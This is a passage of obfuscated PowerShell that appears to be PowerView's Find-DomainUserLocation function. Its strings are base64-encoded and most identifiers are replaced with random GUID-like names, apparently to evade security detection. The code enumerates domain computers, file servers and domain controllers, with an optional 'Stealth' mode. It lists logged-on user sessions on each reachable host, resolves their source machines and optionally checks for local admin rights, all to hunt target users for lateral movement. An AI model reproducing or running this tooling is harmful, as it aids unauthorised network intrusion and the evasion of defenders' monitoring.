        $ShowAll,
        [Switch]
        $Stealth,
        [String]
        [ValidateSet('DFS', 'DC', 'File', 'All')]
        $StealthSource = 'All',
        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        ${f613cdfca6cd4ec9830841a185fa0248} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))] = ${a641242359464a5bb75a49b867c183a4} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = ${de1879a6375144efa1511357bfecd42f} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = ${b0dd23003b9d4473818f6e8c6cc2e082} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${fd6c4173863b4be9aa10603a30f19bb1} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $UserIdentity }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $UserLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAEMAbwB1AG4AdAA=')))] = $UserAdminCount }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGwAbABvAHcARABlAGwAZQBnAGEAdABpAG8AbgA=')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AEQAZQBsAGUAZwBhAHQAaQBvAG4A')))] = $UserAllowDelegation }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${ca0e0dbccca747a0b83a2af44d4d9165} = @()
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ${ca0e0dbccca747a0b83a2af44d4d9165} = @(${ac645935110b4eaea96e7bf6f0b2d7f4})
        }
        else {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGUAYQBsAHQAaAA=')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAFMAdABlAGEAbAB0AGgAIABlAG4AdQBtAGUAcgBhAHQAaQBvAG4AIAB1AHMAaQBuAGcAIABzAG8AdQByAGMAZQA6ACAAJABTAHQAZQBhAGwAdABoAFMAbwB1AHIAYwBlAA==')))
                ${e9c71d2cba6e4feabe2a59eed6dfc953} = New-Object System.Collections.ArrayList
                if ($StealthSource -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQB8AEEAbABsAA==')))) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAFEAdQBlAHIAeQBpAG4AZwAgAGYAbwByACAAZgBpAGwAZQAgAHMAZQByAHYAZQByAHMA')))
                    ${e3767e52e4324819856f6ae885784bce} = @{}
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${e3767e52e4324819856f6ae885784bce}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { ${e3767e52e4324819856f6ae885784bce}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { ${e3767e52e4324819856f6ae885784bce}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${e3767e52e4324819856f6ae885784bce}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${e3767e52e4324819856f6ae885784bce}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${e3767e52e4324819856f6ae885784bce}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${e3767e52e4324819856f6ae885784bce}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${e3767e52e4324819856f6ae885784bce}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${e3767e52e4324819856f6ae885784bce}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                    ${d3859c72bbc74c5da9c528db5ac30e31} = a8c7ae528e8e44439e0f84002f04dcb6 @e3767e52e4324819856f6ae885784bce
                    if (${d3859c72bbc74c5da9c528db5ac30e31} -isnot [System.Array]) { ${d3859c72bbc74c5da9c528db5ac30e31} = @(${d3859c72bbc74c5da9c528db5ac30e31}) }
                    ${e9c71d2cba6e4feabe2a59eed6dfc953}.AddRange( ${d3859c72bbc74c5da9c528db5ac30e31} )
                }
                if ($StealthSource -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABGAFMAfABBAGwAbAA=')))) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAFEAdQBlAHIAeQBpAG4AZwAgAGYAbwByACAARABGAFMAIABzAGUAcgB2AGUAcgBzAA==')))
                }
                if ($StealthSource -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAHwAQQBsAGwA')))) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAFEAdQBlAHIAeQBpAG4AZwAgAGYAbwByACAAZABvAG0AYQBpAG4AIABjAG8AbgB0AHIAbwBsAGwAZQByAHMA')))
                    ${1fb15456314f40c0ba1d4a0a93eaccaf} = @{
                        'LDAP' = $True
                    }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${1fb15456314f40c0ba1d4a0a93eaccaf}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { ${1fb15456314f40c0ba1d4a0a93eaccaf}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${1fb15456314f40c0ba1d4a0a93eaccaf}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${1fb15456314f40c0ba1d4a0a93eaccaf}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                    ${38be46bf5edd4401a0cb78e4ec717f18} = cd8c63b899224544917fb2ed84dfed27 @1fb15456314f40c0ba1d4a0a93eaccaf | Select-Object -ExpandProperty dnshostname
                    if (${38be46bf5edd4401a0cb78e4ec717f18} -isnot [System.Array]) { ${38be46bf5edd4401a0cb78e4ec717f18} = @(${38be46bf5edd4401a0cb78e4ec717f18}) }
                    ${e9c71d2cba6e4feabe2a59eed6dfc953}.AddRange( ${38be46bf5edd4401a0cb78e4ec717f18} )
                }
                ${ca0e0dbccca747a0b83a2af44d4d9165} = ${e9c71d2cba6e4feabe2a59eed6dfc953}.ToArray()
            }
            else {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAFEAdQBlAHIAeQBpAG4AZwAgAGYAbwByACAAYQBsAGwAIABjAG8AbQBwAHUAdABlAHIAcwAgAGkAbgAgAHQAaABlACAAZABvAG0AYQBpAG4A')))
                ${ca0e0dbccca747a0b83a2af44d4d9165} = cec1def5409041f78ed8ecd436f7fa52 @f613cdfca6cd4ec9830841a185fa0248 | Select-Object -ExpandProperty dnshostname
            }
        }
        Write-Verbose "[Find-DomainUserLocation] TargetComputers length: $(${ca0e0dbccca747a0b83a2af44d4d9165}.Length)"
        if (${ca0e0dbccca747a0b83a2af44d4d9165}.Length -eq 0) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAE4AbwAgAGgAbwBzAHQAcwAgAGYAbwB1AG4AZAAgAHQAbwAgAGUAbgB1AG0AZQByAGEAdABlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${0ce819799cf642488511b0b5b4bace0c} = $Credential.GetNetworkCredential().UserName
        }
        else {
            ${0ce819799cf642488511b0b5b4bace0c} = ([Environment]::UserName).ToLower()
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAG8AdwBBAGwAbAA=')))]) {
            ${4b406f96881443dfb2a0a5023913353c} = @()
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGwAbABvAHcARABlAGwAZQBnAGEAdABpAG8AbgA=')))]) {
            ${4b406f96881443dfb2a0a5023913353c} = c4bfd1c2423d4aa09ab761a468a38f7e @fd6c4173863b4be9aa10603a30f19bb1 | Select-Object -ExpandProperty samaccountname
        }
        else {
            ${352237a1f2ea46558662166b4069b35c} = @{
                'Identity' = $UserGroupIdentity
                'Recurse' = $True
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { ${352237a1f2ea46558662166b4069b35c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { ${352237a1f2ea46558662166b4069b35c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${352237a1f2ea46558662166b4069b35c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${352237a1f2ea46558662166b4069b35c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${352237a1f2ea46558662166b4069b35c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${352237a1f2ea46558662166b4069b35c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${352237a1f2ea46558662166b4069b35c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${352237a1f2ea46558662166b4069b35c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            ${4b406f96881443dfb2a0a5023913353c} = d5ea7ec938ad4aeeacb8bc5e972e183f @352237a1f2ea46558662166b4069b35c | Select-Object -ExpandProperty MemberName
        }
        Write-Verbose "[Find-DomainUserLocation] TargetUsers length: $(${4b406f96881443dfb2a0a5023913353c}.Length)"
        if ((-not $ShowAll) -and (${4b406f96881443dfb2a0a5023913353c}.Length -eq 0)) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAE4AbwAgAHUAcwBlAHIAcwAgAGYAbwB1AG4AZAAgAHQAbwAgAHQAYQByAGcAZQB0AA==')))
        }
        ${91e68d106c5344ba911e56802fc167ea} = {
            Param(${ac645935110b4eaea96e7bf6f0b2d7f4}, ${4b406f96881443dfb2a0a5023913353c}, ${0ce819799cf642488511b0b5b4bace0c}, $Stealth, ${d4e1296b557440d7b406a9378e307719})
            if (${d4e1296b557440d7b406a9378e307719}) {
                $Null = cb88cae78c7042af8720773b18453f4d -d4e1296b557440d7b406a9378e307719 ${d4e1296b557440d7b406a9378e307719} -e63bcfc245bf4c15941e2e6d5c906ee3
            }
            ForEach (${f54716d2d17141569e4a6cfb0d93653b} in ${ac645935110b4eaea96e7bf6f0b2d7f4}) {
                ${d7b577ae558c406581a98832155768ff} = Test-Connection -Count 1 -Quiet -ComputerName ${f54716d2d17141569e4a6cfb0d93653b}
                if (${d7b577ae558c406581a98832155768ff}) {
                    ${047e6827d23f46cbac9772a1d54706c2} = e2676cf60bd549d88b901625237cfabc -ac645935110b4eaea96e7bf6f0b2d7f4 ${f54716d2d17141569e4a6cfb0d93653b}
                    ForEach (${2f7cba0a183d419fa4df4b17f7c77de7} in ${047e6827d23f46cbac9772a1d54706c2}) {
                        ${25e26cdbb7fa4a6c9a2f2483c34b00e6} = ${2f7cba0a183d419fa4df4b17f7c77de7}.UserName
                        ${387e5606927043f49c3a3171e84350af} = ${2f7cba0a183d419fa4df4b17f7c77de7}.CName
                        if (${387e5606927043f49c3a3171e84350af} -and ${387e5606927043f49c3a3171e84350af}.StartsWith('\\')) {
                            ${387e5606927043f49c3a3171e84350af} = ${387e5606927043f49c3a3171e84350af}.TrimStart('\')
                        }
                        if ((${25e26cdbb7fa4a6c9a2f2483c34b00e6}) -and (${25e26cdbb7fa4a6c9a2f2483c34b00e6}.Trim() -ne '') -and (${25e26cdbb7fa4a6c9a2f2483c34b00e6} -notmatch ${0ce819799cf642488511b0b5b4bace0c}) -and (${25e26cdbb7fa4a6c9a2f2483c34b00e6} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkACQA'))))) {
                            if ( (-not ${4b406f96881443dfb2a0a5023913353c}) -or (${4b406f96881443dfb2a0a5023913353c} -contains ${25e26cdbb7fa4a6c9a2f2483c34b00e6})) {
                                ${8ce99e32291646dc9649cd2a24d88211} = New-Object PSObject
                                ${8ce99e32291646dc9649cd2a24d88211} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) $Null
                                ${8ce99e32291646dc9649cd2a24d88211} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) ${25e26cdbb7fa4a6c9a2f2483c34b00e6}
                                ${8ce99e32291646dc9649cd2a24d88211} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${f54716d2d17141569e4a6cfb0d93653b}
                                ${8ce99e32291646dc9649cd2a24d88211} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAA=='))) ${387e5606927043f49c3a3171e84350af}
                                try {
                                    ${b1036220c468475d8204f4d2079e3ffc} = [System.Net.Dns]::GetHostEntry(${387e5606927043f49c3a3171e84350af}) | Select-Object -ExpandProperty HostName
                                    ${8ce99e32291646dc9649cd2a24d88211} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAE4AYQBtAGUA'))) ${b1036220c468475d8204f4d2079e3ffc}
                                }
                                catch {
                                    ${8ce99e32291646dc9649cd2a24d88211} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAE4AYQBtAGUA'))) $Null
                                }
                                if ($CheckAccess) {
                                    ${e8029ede0a9443859b57bf753ba2605e} = (c046e85b237e4b6eb3504c4f264b59a2 -ac645935110b4eaea96e7bf6f0b2d7f4 ${387e5606927043f49c3a3171e84350af}).IsAdmin
                                    ${8ce99e32291646dc9649cd2a24d88211} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) ${e8029ede0a9443859b57bf753ba2605e}.IsAdmin
                                }
                                else {
                                    ${8ce99e32291646dc9649cd2a24d88211} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) $Null
                                }
